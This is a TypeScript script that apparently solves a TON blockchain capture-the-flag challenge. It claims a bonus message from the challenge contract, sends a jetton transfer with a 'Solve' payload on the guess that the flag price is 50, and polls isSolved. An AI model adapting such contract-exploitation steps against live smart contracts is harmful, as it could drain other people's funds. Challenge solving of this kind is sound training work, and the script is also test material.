import { TonClient, WalletContractV3R2 } from '@ton/ton';
import { keyPairFromSeed } from '@ton/crypto';
import { Address, toNano, beginCell, SendMode, TupleItem, internal } from '@ton/core';
import * as fs from 'fs';

const SESSION_FILE = 'session.json';
interface SessionData { uuid: string; challenge: string; api: string; wallet_id: number; seed: string; }
function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function getBal(client: TonClient, addr: Address) { return client.getBalance(addr); }
async function getJettonBal(client: TonClient, addr: Address) {
    try { const r = await client.runMethod(addr, 'get_wallet_data'); return r.stack.readBigNumber(); } catch { return null; }
}

async function sendXfer(openedWallet: any, wallet: any, provider: any, kp: any, msg: any) {
    const seqno = await wallet.getSeqno(provider);
    await openedWallet.sendTransfer({
        seqno, secretKey: kp.secretKey,
        messages: [msg],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) return ns; }
    throw new Error(`seqno stuck`);
}

async function main() {
    const s: SessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf-8'));
    const client = new TonClient({ endpoint: s.api.replace(/\/+$/, '') + '/jsonRPC', timeout: 30000 });
    const challengeAddr = Address.parse(s.challenge);
    const kp = keyPairFromSeed(Buffer.from(s.seed, 'hex'));
    const wallet = WalletContractV3R2.create({ workchain: -1, publicKey: kp.publicKey, walletId: s.wallet_id });
    const openedWallet = client.open(wallet);
    const provider = client.provider(wallet.address, wallet.init);

    const mr = await client.runMethod(challengeAddr, 'minter');
    const minter = mr.stack.readAddress();
    const pwc = beginCell().storeAddress(wallet.address).endCell();
    const pwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: pwc } as TupleItem]);
    const pJetton = pwr.stack.readAddress();
    const cwc = beginCell().storeAddress(challengeAddr).endCell();
    const cwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: cwc } as TupleItem]);
    const cJetton = cwr.stack.readAddress();

    console.log(`Initial: TON=${Number(await getBal(client, wallet.address))/1e9}\n`);

    // Just ONE bonus with max value
    const seqno = await wallet.getSeqno(provider);
    const bonusBody = beginCell().storeUint(0x13370002, 32).storeUint(0, 64).endCell();
    console.log(`Bonus (seqno=${seqno}, value=0.45 TON)...`);
    await openedWallet.sendTransfer({
        seqno, secretKey: kp.secretKey,
        messages: [internal({ to: challengeAddr, value: toNano('0.45'), body: bonusBody, bounce: false })],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) break; }
    await sleep(15000);
    console.log(`After: Jetton=${await getJettonBal(client, pJetton)} TON=${Number(await getBal(client, wallet.address))/1e9}`);

    // Check minter balance delta
    const minterBal = await client.runMethod(minter, 'get_jetton_data');
    console.log(`Minter supply: ${minterBal.stack.readBigNumber()}`);

    // Now try transfer 50 jettons to cJetton with Solve (in case FLAG_PRICE somehow = 50)
    const seqno2 = await wallet.getSeqno(provider);
    const xferBody = beginCell()
        .storeUint(0x0f8a7ea5, 32).storeUint(0, 64)
        .storeCoins(50n).storeAddress(cJetton).storeAddress(null)
        .storeBit(0).storeCoins(toNano('0.05'))
        .storeUint(0x13370005, 32).storeUint(0, 64)
    .endCell();
    console.log(`\nSending 50 jettons + Solve...`);
    await openedWallet.sendTransfer({
        seqno: seqno2, secretKey: kp.secretKey,
        messages: [internal({ to: pJetton, value: toNano('0.25'), body: xferBody, bounce: false })],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno2) break; }
    await sleep(20000);
    console.log(`Jetton after: ${await getJettonBal(client, pJetton)}`);

    // isSolved
    for (let i = 0; i < 16; i++) {
        try { const r = await client.runMethod(challengeAddr, 'isSolved'); const ok = r.stack.readBoolean(); if (ok) { console.log(`\n🎉 SOLVED!`); process.exit(0); } console.log(`  ${i+1}: false`); } catch {}
        await sleep(5000);
    }

    // Check challenge jetton wallet balance (did jettons arrive?)
    const cJetData = await getJettonBal(client, cJetton);
    console.log(`Challenge jetton wallet: ${cJetData}`);
}
main().catch(console.error);
